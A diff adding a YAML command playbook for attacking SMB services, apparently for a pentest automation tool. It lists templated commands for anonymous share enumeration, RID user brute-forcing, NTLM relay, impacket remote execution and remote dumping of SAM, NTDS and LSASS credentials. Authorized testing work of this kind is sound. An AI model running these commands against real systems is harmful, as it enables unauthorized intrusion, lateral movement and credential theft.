@@ -1,0 +1,66 @@
+service: smb
+ports: [139, 445]
+categories:
+  enumeration:
+    - id: smb_null_session
+      description: "Test null/anonymous session"
+      command: "smbclient -N -L //{IP}"
+      priority: high
+    - id: smb_enum4linux
+      description: "Full enum4linux scan"
+      command: "enum4linux -a {IP}"
+      priority: high
+    - id: smb_shares
+      description: "Enumerate shares (CME)"
+      command: "crackmapexec smb {IP} --shares"
+      priority: high
+    - id: smb_shares_auth
+      description: "Enumerate shares with creds"
+      command: "crackmapexec smb {IP} --shares -u '{USER}' -p '{PASS}'"
+      priority: medium
+    - id: smb_users
+      description: "Enumerate users via RID brute"
+      command: "crackmapexec smb {IP} --rid-brute"
+      priority: high
+    - id: smb_spider
+      description: "Spider shares for sensitive files"
+      command: "crackmapexec smb {IP} --spider_plus -u '{USER}' -p '{PASS}'"
+      priority: medium
+    - id: smb_signing
+      description: "Check SMB signing (relay candidate)"
+      command: "crackmapexec smb {IP} --gen-relay-list relay.txt"
+      priority: high
+    - id: smb_pass_pol
+      description: "Get password policy"
+      command: "crackmapexec smb {IP} --pass-pol"
+      priority: medium
+  exploitation:
+    - id: smb_relay
+      description: "NTLM relay (if signing disabled)"
+      command: "ntlmrelayx.py -tf targets.txt -smb2support"
+      priority: high
+    - id: smb_psexec
+      description: "PsExec with admin creds"
+      command: "impacket-psexec {DOMAIN}/{USER}:{PASS}@{IP}"
+      priority: medium
+    - id: smb_wmiexec
+      description: "WMIExec (stealthier)"
+      command: "impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{IP}"
+      priority: medium
+    - id: smb_smbexec
+      description: "SMBExec"
+      command: "impacket-smbexec {DOMAIN}/{USER}:{PASS}@{IP}"
+      priority: medium
+    - id: smb_eternalblue
+      description: "Check MS17-010 (EternalBlue)"
+      command: "nmap --script smb-vuln-ms17-010 -p 445 {IP}"
+      priority: medium
+  post_exploitation:
+    - id: smb_secretsdump
+      description: "Dump SAM/LSA/NTDS secrets"
+      command: "impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{IP}"
+      priority: high
+    - id: smb_lsassy
+      description: "Dump LSASS remotely"
+      command: "lsassy -u '{USER}' -p '{PASS}' -d {DOMAIN} {IP}"
+      priority: high
